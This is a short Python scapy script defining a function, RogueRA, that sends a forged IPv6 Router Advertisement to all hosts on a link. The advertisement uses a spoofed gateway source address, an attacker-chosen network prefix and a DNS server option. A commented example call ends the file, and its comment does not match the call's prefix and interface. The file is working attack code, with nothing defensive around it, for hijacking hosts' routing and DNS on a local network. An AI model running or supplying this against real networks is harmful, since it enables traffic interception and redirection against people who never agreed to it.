from scapy.all import IPv6, ICMPv6NDOptPrefixInfo, ICMPv6ND_RA, send, ICMPv6NDOptRDNSS

def RogueRA(PREFIX, PREFIXLENGTH, IFACEM, VLIFETIME, PLIFETIME, DNS):
    srcAddr = "fe80::1"  # Fake source IPv6 as a Default Gateway
    dstAddr = "ff02::1"  # All Hosts multicast address

    # Define information about prefix
    prefixInfo = ICMPv6NDOptPrefixInfo(
        prefixlen=PREFIXLENGTH,
        validlifetime=VLIFETIME,
        preferredlifetime=PLIFETIME,
        prefix=PREFIX
    )

    # Create a proper RA IPv6 packet
    ra = IPv6(src=srcAddr, dst=dstAddr) / ICMPv6ND_RA() / prefixInfo / ICMPv6NDOptRDNSS(dns=DNS)
    # Send packet
    send(ra, iface=IFACEM)

# EXAMPLE USAGE
# Use prefix 2001:db8:dead:beef::/64, output interface is eth0,
# valid lifetime is 1 hour, preferred lifetime is 30 minutes,
# DNS is 2001:1:1::1
#RogueRA("2001:db18:dead:beef::", 64, "ens4", 3600, 1800, ["2001:1:1::1"])
